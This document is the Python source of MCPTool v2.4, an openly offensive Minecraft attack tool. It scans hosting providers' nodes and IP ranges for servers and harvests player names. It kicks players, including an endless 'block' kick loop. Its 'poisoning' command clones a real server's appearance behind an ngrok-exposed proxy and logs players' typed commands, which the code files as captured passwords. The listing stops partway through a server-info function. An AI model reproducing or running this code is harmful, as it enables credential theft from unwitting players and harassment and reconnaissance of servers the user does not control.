# =============================================================================
#                      MCPTool v2.4 www.github.com/wrrulos
#                         Pentesting Tool for Minecraft
#                               Made by wRRulos
#                                  @wrrulos
# =============================================================================

# Any error report it to my discord please, thank you.
# Programmed in Python 3.10.4

import hashlib
import os
import sys
import time
import requests
import json
import re
import socket
import uuid
import subprocess
import shutil
import base64
import traceback

from config.files.mc_replace_text import mc_replace_text_mccolors, mc_replace_text_json
from config.files.questions import skip_0on, specific_name, specific_version
from config.files.checks_mcptool import check_node, check_server, check_encoding, check_java, check_file, check_folder, check_nmap, check_port, check_qubo, check_ngrok, check_updates, check_nmap_error, motd_1, motd_2, motd_3
from mcstatus import JavaServer
from datetime import datetime
from colorama import Fore, init
from json import JSONDecodeError


init()

# CONFIG

DEBUG = False
SKIP_LOAD = False

# COLORS

red = Fore.RED
lred = Fore.LIGHTRED_EX
black = Fore.BLACK
lblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
lwhite = Fore.LIGHTWHITE_EX
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
cyan = Fore.CYAN
lcyan = Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lmagenta = Fore.LIGHTMAGENTA_EX
yellow = Fore.YELLOW
lyellow = Fore.LIGHTYELLOW_EX
blue = Fore.BLUE
lblue = Fore.LIGHTBLUE_EX
reset = Fore.RESET

# APIS

mojang_api = "https://api.mojang.com/users/profiles/minecraft/"
mcsrvstat_api = "https://api.mcsrvstat.us/2/"

# ANIMATIONS

animation = r"|/-\\"
animation1 = ".."

# OTHERS

host_list = ["minehost", "holyhosting", "vultam"]
script__version = "2.4"
number_of_servers = 0
version_link = "https://raw.githubusercontent.com/wrrulos/MCPTool/main/config/data/version"
discord_link = "discord.gg/ewPyW4Ghzj"
bot_connect = ""
py = ""
sfile = False

banner = rf""" 
{lred}                         __
{lred}           ---_ ...... _/_ -
{lred}          /  .      ./ .'*\ \
{lred}          : '         /__-'   \.
{lred}         /                      )     {lred}___  ________ ______ _____ _____  _____ _       
{lred}       _/                  >   .'     {lred}|  \/  /  __ \| ___ \_   _|  _  ||  _  | |       {lred}Discord: {white}Rulo#9224
{lred}     /   '   .       _.-" /  .'       {lred}| |\/| | |    |  __/  | | | | | || | | | |       {lred}Github: {white}@wrrulos
{white}     \           __/"     /.'         {white}| |  | | \__/\| |     | | \ \_/ /\ \_/ / |____
{white}       \ '--  .-" /     //'           {white}\_|  |_/\____/\_|     \_/  \___/  \___/\_____/   {lred}Minecraft Pentesting Tool {lgreen}v{script__version}{green}
{white}        \|  \ | /     //                        
{white}             \:     //                
{white}          `\/     //                  Do you want to join my discord? Use discord command
{white}           \__`\/ /  
{white}               \_|{reset}\

"""  # Thanks Ghosty for helping me with the banner <3

banner_2 = rf"""
{lred}___  ________ ______ _____ _____  _____ _       
{lred}|  \/  /  __ \| ___ \_   _|  _  ||  _  | |       {lred}Discord: {white}Rulo#9224
{lred}| |\/| | |    |  __/  | | | | | || | | | |       {lred}Github: {white}@wrrulos
{white}| |  | | \__/\| |     | | \ \_/ /\ \_/ / |____
{white}\_|  |_/\____/\_|     \_/  \___/  \___/\_____/   {lred}Minecraft Pentesting Tool {lgreen}v{script__version}{green}
"""

loading_banner = rf"""





                                         {lred}                         __
                                         {lred}           ---_ ...... _/_ -
                                         {lred}          /  .      ./ .'*\ \
                                         {lred}          : '         /__-'   \.
                                         {lred}         /                      )     
                                         {lred}       _/                  >   .'     
                                         {lred}     /   '   .       _.-" /  .'      
                                         {white}     \           __/"     /.'      
                                         {white}       \ '--  .-" /     //'          
                                         {white}        \|  \ | /     //      
                                         {white}          `\/     //
                                         {white}           \__`\/ /                    
                                         {white}               \_|{reset}

"""

help_message = f"""
     ╔══════════════════════════════════╦═══════════════════════════════════════╗                          
     ║  Command categories              ║             Description               ║
     ║                                  ║                                       ║
     ║  ► Scanners                      ║                                       ║
     ║                                  ║                                       ║
     ║    • scan [ip]                   ║  Scan the ports of an IP.             ║
     ║    • qubo [ip] [ports] [th] [ti] ║  Scan the IP using quboscanner.       ║
     ║    • host [host] [ports]         ║  Scans the nodes of a host.           ║
     ║    • checker [file]              ║  Check the servers of a file.         ║
     ║    • sfile [file] [ports]        ║  Scan a list of ips addresses         ║
     ║                                  ║  from a file.                         ║
     ║  ► Information                   ║                                       ║
     ║                                  ║                                       ║
     ║    • server [ip]                 ║  Displays information about a server. ║
     ║    • player [name]               ║  Displays information about a player. ║
     ║    • mods [ip:port]              ║  Show mods on this server.            ║
     ║    • listening [ip:port]         ║  Get the names of the users from the  ║
     ║                                  ║  server.                              ║
     ║  ► Attacking                     ║                                       ║
     ║                                  ║                                       ║
     ║    • kick [ip:port] [name]       ║  Kick a player from the server        ║
     ║    • kickall [ip:port]           ║  Kick all players from the server     ║
     ║    • block [ip:port] [name]      ║  Kick a player from the server        ║ 
     ║                                  ║  without stopping (infinite loop)     ║
     ║    • poisoning [ip] [local-port] ║  Create a proxy connection that       ║
     ║                                  ║  redirects to a server and captures   ║
     ║  ► Others                        ║                                       ║
     ║                                  ║                                       ║
     ║    • discord                     ║  Show my server link.                 ║
     ║    • clear                       ║  Clean the screen.                    ║
     ║    • bungee [ip:port]            ║  Start a proxy server.                ║
     ║    • bot [ip:port]               ║  Connect to a server using a bot.     ║
     ║                                  ║                                       ║
     ╚══════════════════════════════════╩═══════════════════════════════════════╝"""

# FUNCTIONS


def connect(name, host, port, version, bot_name):
    """ Connect bot """
    try:
        kicked = False

        if name == "connect":
            print(py)
            os.system("cls || clear")
            print(banner_2, white)

            if version is None:
                if bot_name is None:
                    os.system(f"{py} config/files/RBot.py -host {host} -p {port} -m connect")

                else:
                    os.system(f"{py} config/files/RBot.py -host {host} -p {port} -n {bot_name} -m connect")
            else:
                if bot_name is None:
                    os.system(f"{py} config/files/RBot.py -host {host} -p {port} -v {version} -m connect")

                else:
                    os.system(f"{py} config/files/RBot.py -host {host} -p {port} -n {bot_name} -v {version} -m connect")

            print(f"\n{lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")
            time.sleep(3)

        elif name == "check":
            result = subprocess.run(f"{py} config/files/RBot.py -host {host} -p {port} -m check -mcptool", stdout=subprocess.PIPE)
            result = mc_replace_text_json(str(result.stdout.decode('utf-8')))
            result = mc_replace_text_mccolors(result)
            result = result.replace("b'", "").replace("\r", "").replace("\n", "").replace("'", "")

            if result == "Timeout":
                print(f"     {lblack}[{lred}CONN{white}ECT{lblack}] {lred}Timeout")

            elif result == "OK":
                print(f"     {lblack}[{lred}CONN{white}ECT{lblack}] {lgreen}Connected")

            else:
                print(f"     {lblack}[{lred}CONN{white}ECT{lblack}] {white}{result}")

        elif name == "kick":
            print("")
            result = subprocess.run(f"{py} config/files/RBot.py -host {host} -p {port} -m kick -mcptool -v {version} -n {bot_name}", stdout=subprocess.PIPE)
            if "Kicking the player" in str(result.stdout.decode('utf-8')):
                print(f"     {lblack}[{lred}KI{white}CK{lblack}] {white}Kicking the player {lgreen}{bot_name}{white}")
                return

            result = mc_replace_text_json(str(result.stdout.decode('utf-8')))
            result = mc_replace_text_mccolors(result)
            result = result.replace("b'", "").replace("\r", "").replace("\n", "").replace("'", "")
            print(f"     {lblack}[{lred}ERR{white}OR{lblack}] {white}{result}")

        elif name == "kickall":
            try:
                players = get_players(f"{host}:{port}")
                if not len(players) == 0:
                    print("")
                    for player in players:
                        if not player == "Anonymous Player":
                            if not " " in player:
                                if kicked:
                                    time.sleep(5)
                                result = subprocess.run(f"{py} config/files/RBot.py -host {host} -p {port} -m kickall-mcptool -mcptool -v {version} -n {player}", stdout=subprocess.PIPE)
                                if "Kicking the player" in str(result.stdout.decode('utf-8')):
                                    print(f"     {lblack}[{lred}KI{white}CK{lblack}] {white}Kicking the player {lgreen}{player}{white}")
                                    return

                                result = mc_replace_text_json(str(result.stdout.decode('utf-8')))
                                result = mc_replace_text_mccolors(result)
                                result = result.replace("b'", "").replace("\r", "").replace("\n", "").replace("'", "")
                                print(f"     {lblack}[{lred}ERR{white}OR{lblack}] {white}{result}")
                                kicked = True

                    print(f"\n     {lblack}[{lred}FINI{white}SHED{lblack}] {white}All players have been kicked from the server!")

                else:
                    print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}There are no players connected.")

            except KeyboardInterrupt:
                print(f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")
                return

        elif name == "block":
            print(f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Blocking user Rulo...")
            while True:
                try:
                    subprocess.run(f"{py} config/files/RBot.py -host {host} -p {port} -m block -mcptool -v {version} -n {bot_name}", stdout=subprocess.PIPE)
                    time.sleep(3)

                except KeyboardInterrupt:
                    print(f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")
                    break

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def load():
    """ Starting MCPTool """
    try:
        os.system("cls || clear")
        print(loading_banner, "\n                                                Checking for updates.", end="")
        time.sleep(0.4)

        for _ in animation1:
            print(_, end="")
            time.sleep(0.4)

        check__updates = check_updates()

        if check__updates:
            os.system("cls || clear")
            print(loading_banner, f"\n                                            {lgreen}New version available on my github.\n\n{white}                                                https://github.com/wrrulos/\n\n")
            time.sleep(1)
            print(f"{white}                                          Starting MCPTool with the current version")
            time.sleep(2)
            return

        os.system("cls || clear")
        print(loading_banner, f"\n                                            {white}You are using the latest version!")
        time.sleep(2)
        return

    except:
        pass


def save_logs(ip, location, title, target, message):
    """ Save logs """
    try:
        date = datetime.now()

        file = f"{location}_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
        f = open(file, "w", encoding="utf8")
        f.write(f"##################\n# {title} #\n##################\n\n")
        f.write(f"[DATE] {str(date.year)}-{str(date.month)}-{str(date.day)}\n[HOUR] {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n[{target}] {str(ip)}\n\n")
        f.write(f"{message}: \n")
        f.close()
        return file

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def nmap_scan(name_command, target, ports, skip, logs_file):
    """ Scan nmap """
    try:
        check_folder("results")
        date = datetime.now()
        scan_file = f"temp_scan_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"

        if not name_command == "host":
            if not sfile:
                check_folder("results/scan")
                os.system("cls || clear")
                print(banner, f"\n     {lblack}[{lred}SCAN{white}NER{lblack}] {white}Scanning {green}{target}{white}.. \n\n     {white}[{lcyan}INFO{white}] {white}Remember that you cannot have the vpn activated to scan!")

        try:
            os.system(f"nmap -p {str(ports)} -T5 -Pn -v -oN {scan_file} {str(target)} >nul 2>&1")

        except KeyboardInterrupt:
            os.remove(scan_file)

        nmap_error = check_nmap_error(scan_file, target)

        if not nmap_error == "None":
            return

        if not name_command == "host":
            logs_file = save_logs(target, "results/scan/scan", "SCAN LOGS", "TARGET", "Servers found")

        scan_ips_list_date = datetime.now()
        scan_ips_list = f"temp_scan_ips_list_{str(scan_ips_list_date.day)}-{str(scan_ips_list_date.month)}-{str(scan_ips_list_date.year)}_{str(scan_ips_list_date.hour)}.{str(scan_ips_list_date.minute)}.{str(scan_ips_list_date.second)}.txt"
        scan_results = open(scan_ips_list, "w+")

        with open(scan_file, encoding="utf8") as nmap_result:
            for line in nmap_result:
                ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line)
                ip = " ".join(ip)
                ip = ip.replace("(", "").replace(")", "")
                port = re.findall("\d{1,5}\/tcp open", line)
                port = " ".join(port)

                if "." in ip:
                    ip_actual = ip

                if "tcp" in port:
                    port = port.replace("/tcp open", "")
                    ip_actual_backup = ip_actual

                    try:
                        ip_actual = ip_actual.split(" ")
                        ip_actual = ip_actual[1]

                    except:
                        ip_actual = ip_actual_backup

                    scan_results.write(f"{ip_actual}:{port}\n")

            scan_results.close()

        with open(scan_ips_list) as scan_results:
            for line in scan_results:
                line = line.replace("\n", "")
                try:
                    get_server(line, skip, logs_file)

                except:
                    pass

        os.remove(scan_file)
        os.remove(scan_ips_list)

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def get_server(ip, skip, logs_file):
    """ Server info """
    global number_of_servers

    try:
        players = None
        srv = JavaServer.lookup(ip)

        response = srv.status()
        motd = mc_replace_text_mccolors(response.description)
        motd_ = response.description.replace('§1', '').replace('§2', '').replace('§3', '').replace('§4', '').replace('§5', '').replace('§6', '').replace('§7', '').replace('§8', '').replace('§9', '').replace('§0', '').replace('§a', '').replace('§b', '').replace('§c', '').replace('§d', '').replace('§e', '').replace('§f', '').replace('§k', '').replace('§l', '').replace('§m', '').replace('§n', '').replace('§o', '').replace('§r', '').replace('\n', '')
        motd_ = re.sub(" +", " ", motd_)
        version = mc_replace_text_mccolors(response.version.name)
        version_ = response.version.name.replace('§1', '').replace('§2', '').replace('§3', '').replace('§4', '').replace('§5', '').replace('§6', '').replace('§7', '').replace('§8', '').replace('§9', '').replace('§0', '').replace('§a', '').replace('§b', '').replace('§c', '').replace('§d', '').replace('§e', '').replace('§f', '').replace('§k', '').replace('§l', '').replace('§m', '').replace('§n', '').replace('§o', '').replace('§r', '').replace('\n', '')
        version_ = re.sub(" +", " ", version_)

        if response.players.sample is not None:
            players = str([f"{player.name} ({player.id})" for player in response.players.sample])
            players = players.replace("[", "").replace("]", "").replace("'", "")

        if skip:
            if not str(response.players.online) == "0":
                pass

            else:
                return

        print(f"\n     {lblack}[{lred}I{white}P{lblack}] {white}{ip}")
        print(f"     {lblack}[{lred}MO{white}TD{lblack}] {white}{motd}")
        print(f"     {lblack}[{lred}Ver{white}sion{lblack}] {white}{version}")
        print(f"     {lblack}[{lred}Proto{white}col{lblack}] {white}{response.version.protocol}")
        print(f"     {lblack}[{lred}Play{white}ers{lblack}] {white}{response.players.online}{lblack}/{white}{response.players.max}")

        if bot_connect:
            host = ip.split(":")
            connect("check", host[0], host[1], None, None)

        with open(logs_file, "a", encoding="utf8") as f:
            f.write(f"\n\n[IP] {ip}")
            f.write(f"\n[MOTD] {motd_}")
            f.write(f"\n[Version] {version_}")
            f.write(f"\n[Protocol] {response.version.protocol}")
            f.write(f"\n[Players] {response.players.online}/{response.players.max}")

        if response.players.sample is not None:
            if players != "":
                try:
                    re.findall(r"[0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z]", players)
                    if "00000000-0000-0000-0000-000000000000" not in players:
                        print(f"     {lblack}[{lred}Nam{white}es{lblack}] {white}{players}")
                        with open(logs_file, "a") as f:
                            f.write(f"\n[Names] {players}")

                except:
                    pass

        number_of_servers += 1

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def get_ngrok_ip():
    """ Get ngrok ip """
    try:
        r = requests.get("http://localhost:4040/api/tunnels")
        r_unicode = r.content.decode("utf-8")
        r_json = json.loads(r_unicode)
        link = r_json["tunnels"][0]["public_url"]
        ipngrok = link.replace("tcp://", "")
        ipngrok = ipngrok.split(":")
        ipngrok2 = socket.gethostbyname(str(ipngrok[0]))
        ip_poisoning = ipngrok2 + ":" + ipngrok[1]
        return ip_poisoning

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def get_port(server):
    """ Get server port """
    try:
        if ":" in server:
            srv = server.split(":")
            return srv[1]

        try:
            r = requests.get(f"{mcsrvstat_api}{server}")
            r_json = r.json()
            port = r_json["port"]
            return port

        except:
            return None

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def get_players(target):
    """ Get the list of players in the server """
    try:
        srv = JavaServer.lookup(target)
        response = srv.status()
        players = []
        if response.players.sample is not None:
            for player in response.players.sample:
                if player.name != "":
                    players.append(player.name)

        return players

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def bot_check():
    global bot_connect

    while True:
        bots = input("\n     Do you want a bot to check if the server can be entered? yes/no -> ")

        if bots.lower() == "y" or bots.lower() == "yes":
            bot_connect = True
            return

        elif bots.lower() == "n" or bots.lower() == "no":
            bot_connect = False
            return

        else:
            continue


def iplist(file):
    try:
        ips = []
        f = open(file, "r+")
        lines = f.readlines()

        for line in lines:
            try:
                line = line.replace("\n", "")

            except:
                pass

            try:
                socket.inet_aton(line)
                ips.append(line)

            except:
                pass

        if len(ips) == 0:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}No ip addresses found in the file.")
            return False, ips

        return True, ips

    except FileNotFoundError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}File not found.")
        return False, None

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


# COMMANDS


def checker_command(file, skip):
    """ Checker command """
    x = 0

    try:
        check__encoding = check_encoding(file)
        f = open(file, "r+", encoding=check__encoding)
        check_folder("results")
        check_folder("results/checker")
        logs_file = save_logs(file, "results/checker/checker", "CHECKER LOGS", "FILE", "Servers found")
        os.system("cls || clear")

        print(banner, f"\n     {lblack}[{lred}CHE{white}CKER{lblack}] {white}Checking the file..")

        if "Nmap done at" in f.read():
            f.close()
            with open(file, encoding=check__encoding) as nmap_result:
                for line in nmap_result:
                    ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line)
                    ip = " ".join(ip)
                    ip = ip.replace("(", "").replace(")", "")
                    port = re.findall("\d{1,5}\/tcp open", line)
                    port = " ".join(port)

                    if "." in ip:
                        ip_current = ip

                    if "tcp" in port:
                        port = port.replace("/tcp open", "")
                        ip_current_backup = ip_current

                        try:
                            ip_current = ip_current.split(" ")
                            ip_current = ip_current[1]

                        except:
                            ip_current = ip_current_backup

                        x += 1
                        get_server(f"{ip_current}:{port}", skip, logs_file)

            return

        with open(file, encoding=check__encoding) as results:
            for line in results:
                ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}", line)
                ip = " ".join(ip)
                if ":" in ip:
                    x += 1
                    get_server(ip, skip, logs_file)

        if x == 0:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}No IP addresses found in the file!")
            return

        return

    except FileNotFoundError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}File not found.")
        return

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def bungee_command(target):
    """ Bungee command """
    try:
        print(f"\n     {lblack}[{lred}PRO{white}XY{lblack}] {white}Starting proxy..")

        config_file = open("config/files/config_bungee.txt", "r")
        yml_config = config_file.read()
        config_file.close()

        config_file = open("config/bungee/config.yml", "w+")
        config_file.truncate(0)
        config_file.write(yml_config)
        config_file.write(f"\n    address: {str(target)}\n")
        config_file.write(f"    restricted: false")
        config_file.close()
        bungee = subprocess.Popen("cd config/bungee && java -Xms512M -Xmx512M -jar WaterFall.jar >nul 2>&1", stdout=subprocess.PIPE, shell=True)
        print(f"\n     {lblack}[{lred}I{white}P{lblack}] {white}127.0.0.1:33330 \n\n     {lblack}[{white}#{lblack}] {white}Press ctrl c to stop the proxy")

        try:
            while True:
                pass

        except KeyboardInterrupt:
            print(f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")
            bungee.kill()

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def poisoning_command(target, port, ngrok_command):
    """ Poisoning command """
    try:
        check_folder("results")
        check_folder("results/poisoning")
        old_content = " "

        r = requests.get(f"{mcsrvstat_api}{target}")
        r_json = r.json()
        online_players = r_json["players"]["online"]
        max_players = r_json["players"]["max"]
        clean = r_json["motd"]["raw"]
        os.remove("config/poisoning/server-icon.png")

        try:
            icon = r_json["icon"]
            data = icon.replace("data:image/png;base64,", "")
            image = base64.b64decode(data)

            with open(f"config/poisoning/server-icon.png", "wb") as f:
                f.write(image)

        except:
            shutil.copy("config/files/default-icon.png", "config/poisoning/server-icon.png")

        try:
            _ = clean[0]
            _ = clean[1]
            n = 1

        except:
            n = 0

        config_file = open("config/files/config_poisoning.txt", "r+")
        yml_config = config_file.read()
        config_file.close()
        yml_port = re.sub("0.0.0.0:[0-9][0-9][0-9][0-9][0-9]", f"0.0.0.0:{port}", yml_config)
        config_file = open("config/poisoning/config.yml", "w+", encoding="utf8")
        config_file.truncate(0)
        config_file.write(yml_port)
        config_file.write(f"\n    address: {str(target)}\n")
        config_file.write(f"    restricted: false")
        config_file.close()
        motd_file = open("config/poisoning/plugins/CleanMOTD/config.yml", "w+", encoding="utf8")
        motd_file.truncate(0)
        motd_file.write(motd_1)
        motd_file.write(f"  maxplayers: {max_players}")
        motd_file.write(motd_2)
        motd_file.write(f"  amount: {online_players}")
        motd_file.write(motd_3)

        logs_file = save_logs(target, "results/poisoning/poisoning", "POISONING LOGS", "SERVER", "Captured passwords")

        if n == 1:
            motd_file.write(f"        {clean[0]}")
            motd_file.write(f"        {clean[1]}")

        else:
            motd_file.write(f'        {clean[0]}')

        motd_file.close()
        os.system("cls || clear")
        check_folder("config/poisoning/plugins/RPoisoner")
        check_file("config/poisoning/plugins/RPoisoner/commands.txt")
        print(banner, f"\n     {lblack}[{lred}PRO{white}XY{lblack}] {white}Starting proxy..")
        time.sleep(1)
        proxy = subprocess.Popen("cd config/poisoning && java -Xms512M -Xmx512M -jar WaterFall.jar >nul 2>&1", stdout=subprocess.PIPE, shell=True)
        print(f"\n     {lblack}[{lred}NGR{white}OK{lblack}] {white}Starting ngrok..")
        ngrok = subprocess.Popen(ngrok_command, stdout=subprocess.PIPE, shell=True)
        time.sleep(1)

        ip_poisoning = get_ngrok_ip()

        print(f"\n     {lblack}[{lred}I{white}P{lblack}] {white}{str(ip_poisoning)}")
        print(f"\n     {lblack}[{lred}I{white}P{lblack}] {white}127.0.0.1:{port}")
        print(f"\n     {lblack}[{white}#{lblack}] {white}Waiting for commands..\n")

        while True:
            try:
                time.sleep(1)
                commands_file = open("config/poisoning/plugins/RPoisoner/commands.txt", "r+", encoding="unicode_escape")
                content = commands_file.readlines()

                if content == old_content:
                    continue

                old_content = content

                for line in content:
                    print(f"     {lblack}[{lgreen}!{lblack}] {white}Command captured {line}")
                    with open(logs_file, "a") as f:
                        f.write(f"Player {line}")

            except KeyboardInterrupt:
                ngrok.kill()
                proxy.kill()
                break

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def qubo_command(target, ports, threads, timeout, skip):
    """ Qubo command """
    try:
        qubo_file = "unknown"
        qubo_ips = []

        os.system("cls || clear")
        check_folder("results")
        check_folder("results/qubo")
        check_folder("config/qubo/outputs")
        file_list = os.listdir("config/qubo/outputs")
        print(banner, f"\n     {lblack}[{lred}SCAN{white}NER{lblack}] {white}Scanning {green}{target} with quboscanner{white}.. \n\n     {white}[{lcyan}INFO{white}] {white}Remember that you cannot have the vpn activated to scan!")

        os.system(f"cd config/qubo && java -Dfile.encoding=UTF-8 -jar qubo.jar -range {target} -ports {ports} -th {threads} -ti {timeout} >nul 2>&1")
        new_file_list = os.listdir("config/qubo/outputs")

        for file in new_file_list:
            if file in file_list:
                pass
            else:
                qubo_file = file

        if qubo_file == "unknown":
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid IP")
            return

        check__encoding = check_encoding(f"config/qubo/outputs/{qubo_file}")

        with open(f"config/qubo/outputs/{qubo_file}", encoding=check__encoding) as qubo_result:
            for line in qubo_result:
                qubo_ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}", line)
                qubo_ip = " ".join(qubo_ip)
                if ":" in qubo_ip:
                    qubo_ips.append(f"{qubo_ip}")

        if len(qubo_ips) == 0:
            print(f"\n{white}     The scan ended and found {lred}0 {white}servers.")
            return

        logs_file = save_logs(target, "results/qubo/qubo", "QUBO LOGS", "TARGET", "Servers found")

        for ip in qubo_ips:
            get_server(ip, skip, logs_file)

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def host_command(host, ports, skip):
    """ Host command """
    try:
        check_folder("results")
        check_folder("results/host")
        nodes = []
        host_nodes = ""
        domain = ""
        num_nodes = 0

        if host == "minehost":
            check_folder("results/host/minehost")
            host_nodes = ("sv1", "sv10", "sv11", "sv15", "sv16", "sv17")
            domain = ".minehost.com.ar"

        if host == "holyhosting":
            check_folder("results/host/holyhosting")
            host_nodes = ("node-germany", "node-newyork", "ca", "tx2", "node-cl2", "node-ashburn", "node-premium3", "node-dallas", "premium2", "node-valdivia", "node-premium", "ar", "node-premiumar", "node-argentina")
            domain = ".holy.gg"

        if host == "vultam":
            check_folder("results/host/vultam")
            host_nodes = ("ca", "ca02", "ca03", "ca04", "ca05", "ca06", "ca07", "mia", "mia02", "mia03", "mia04", "mia05", "mia06", "mia07", "mia08", "mia09", "mia10", "mia12", "mia13", "mia14", "mia15", "mia16", "fr01", "fr02", "fr03", "ny", "ny02", "ny04", "ny05", "ny06", "ny07", "de", "de02")
            domain = ".vultam.net"

        logs_file = save_logs(host, f"results/host/{host}/{host}", "HOST LOGS", "HOST", "Servers found")

        os.system("cls || clear")
        print(banner, f"\n     {white}[{lgreen}#{white}] {white}Scanning the hosting {green}{host}{white}.. \n\n     {white}[{lcyan}INFO{white}] {white}Remember that you cannot have the vpn activated to scan!")
        time.sleep(1)

        for node in host_nodes:
            try:
                node_ip = socket.gethostbyname(f"{str(node)}{str(domain)}")
                nodes.append(node_ip)
                num_nodes += 1
            except:
                pass

        if num_nodes == 0:
            print(f"\n     {lblack}[{lred}-{lblack}] {white}No active nodes were found. Try again later")
            return

        print(f"\n     {lblack}[{lgreen}+{lblack}] {white}Found nodes: {num_nodes}")

        for node in nodes:
            nmap_scan("host", node, ports, skip, logs_file)

    except Exception as e:
        if DEBUG:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

        pass


def mods_command(server):
    """ Mods command """
    try:
        r = requests.get(f"{mcsrvstat_api}{server}")
        r_json = r.json()
        mods = r_json["mods"]["names"]
        print(f"\n     {lblack}[{lred}MO{white}DS{lblack}] {white}Mods found: {lgreen}", end="")

        for _ in mods:
            print(f"{_} ", end="")

        print("")

    except KeyboardInterrupt:
        pass

    except TimeoutError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")

    except KeyError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}I couldn't find the mods for this server!")

    except Exception as e:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}I couldn't find the mods for this server! \n DEBUG: \n {e} {traceback.format_exc()}")


def listening_command(target):
    """ Listening command """
    player_list = []
    found = False
    print(f"\n     {lblack}[{lred}LISTE{white}NING{lblack}] {white}Waiting for the players..")

    while True:
        try:
            srv = JavaServer.lookup(target)
            response = srv.status()
            if response.players.sample is not None:
                for player in response.players.sample:
                    if player.name != "":
                        if not found:
                            print(f"\n     {lblack}[{lred}FOU{white}ND{lblack}] {white}Players found: {lgreen}", end="")
                            found = True

                        if f"{player.name} ({player.id})" not in player_list:
                            player_found = f"{player.name} ({player.id})"
                            player_list.append(player_found)
                            print(f"{player_found}, ", end="")
                            sys.stdout.flush()

            time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")
            return

        except Exception as e:
            if DEBUG:
                print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}DEBUG: \n {e} {traceback.format_exc()}")

            pass


def server_command(server):
    """ Server command """
    players = None

    try:
        try:
            r = requests.get(f"{mcsrvstat_api}{server}")
            r_json = r.json()
            ip = r_json["ip"]
            port = r_json["port"]

        except:
            ip = "127.0.0.1"
            port = 25565

        srv = JavaServer.lookup(server)

        response = srv.status()
        motd = mc_replace_text_mccolors(response.description)
        version = mc_replace_text_mccolors(response.version.name)

        if response.players.sample is not None:
            players = str([f"{player.name} ({player.id})" for player in response.players.sample])
            players = players.replace("[", "").replace("]", "").replace("'", "")

        print(f"\n     {lblack}[{lred}I{white}P{lblack}] {white}{ip}:{port}")
        print(f"     {lblack}[{lred}MO{white}TD{lblack}] {white}{motd}")
        print(f"     {lblack}[{lred}Ver{white}sion{lblack}] {white}{version}")
        print(f"     {lblack}[{lred}Proto{white}col{lblack}] {white}{response.version.protocol}")
